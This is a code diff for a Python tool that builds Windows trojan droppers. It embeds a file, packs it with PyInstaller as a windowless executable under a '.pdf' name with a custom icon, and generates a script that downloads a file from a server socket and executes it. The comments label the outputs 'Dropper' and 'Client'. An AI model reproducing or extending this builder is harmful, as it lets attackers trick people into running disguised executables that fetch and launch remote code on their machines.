@@ -12,9 +12,11 @@ import os
 import sys
 import socket
 import tempfile
+import subprocess
+
 
 BINARY_BASE64_DATA = "{base64_data}"
-EMBEDDED_FILENAME = "{embedded_filename}.pdf"
+EMBEDDED_FILENAME = "{embedded_filename}"
 SERVER_IP = "{server_ip}"
 SERVER_PORT = {server_port}
 
@@ -69,7 +71,7 @@ def extract_and_open_file():
                 received += len(chunk)
 
         s.close()
-        os.startfile(client_path)
+        subprocess.run([client_path, SERVER_IP, str(SERVER_PORT)])
 
     except Exception as e:
         print(f"Socket error: {{e}}")
@@ -78,6 +80,40 @@ if __name__ == "__main__":
     extract_and_open_file()
 """
 
+# Detect server IP
+def find_server_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        server_ip = s.getsockname()[0]
+        s.close()
+        return server_ip
+    except Exception:
+        return "127.0.0.1"
+
+#create dropper and client exe files and clean up
+def genereate_exe(output_script_name,exe_name=None, icon_path=None):
+    command = [
+        sys.executable,
+        "-m",
+        "PyInstaller",
+        "--onefile",
+        "--noconsole",
+        "--name",
+        exe_name,
+        output_script_name
+    ]
+    if icon_path and icon_path.lower().endswith(".ico"):
+        command.append(f"--icon={icon_path}")
+    try:
+        subprocess.run(command, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"PyInstaller failed: {e}")
+    finally:
+        # Cleanup
+        if os.path.exists(exe_name + ".spec"): os.remove(exe_name + ".spec")
+        for d in ['build', '__pycache__']:
+            if os.path.exists(d): shutil.rmtree(d, ignore_errors=True)
 
 def create_delivery_script(file_path, icon_path=None):
     if not os.path.exists(file_path):
@@ -91,15 +127,8 @@ def create_delivery_script(file_path, icon_path=None):
     with open(file_path, "rb") as f:
         binary_data = f.read()
     base64_data = base64.b64encode(binary_data).decode()
-
-    # Detect server IP
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        server_ip = s.getsockname()[0]
-        s.close()
-    except Exception:
-        server_ip = "127.0.0.1"
+    
+    server_ip=find_server_ip()
 
     # Write Python script
     final_script = APP_TEMPLATE.format(
@@ -115,32 +144,14 @@ def create_delivery_script(file_path, icon_path=None):
     clean_name = re.sub(r'[^\w\-_\.]', '', original_filename).replace('.', '_')
     if not clean_name:
         clean_name = "EmbeddedFile"
-    exe_name = f"Extractor_{clean_name}"
+    exe_name = f"Extractor_{clean_name}.pdf"
 
-    # Build PyInstaller command
-    command = [
-        sys.executable,
-        "-m",
-        "PyInstaller",
-        "--onefile",
-        "--noconsole",
-        "--name", exe_name,
-        output_script_name
-    ]
-    if icon_path and icon_path.lower().endswith(".ico"):
-        command.append(f"--icon={icon_path}")
+    #generate Dropper and Client exe files
+    genereate_exe(output_script_name,exe_name, icon_path)
+    genereate_exe("Client.py","Client")
+    if os.path.exists(output_script_name): os.remove(output_script_name)
 
-    try:
-        subprocess.run(command, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"PyInstaller failed: {e}")
-    finally:
-        # Cleanup
-        for f in [output_script_name, exe_name + ".spec"]:
-            if os.path.exists(f): os.remove(f)
-        for d in ['build', '__pycache__']:
-            if os.path.exists(d): shutil.rmtree(d, ignore_errors=True)
-
+    
 if __name__ == "__main__":
     if len(sys.argv) < 2 or len(sys.argv) > 3:
         print("Usage: python windows_file_packer.py <file_path> [icon.ico]")
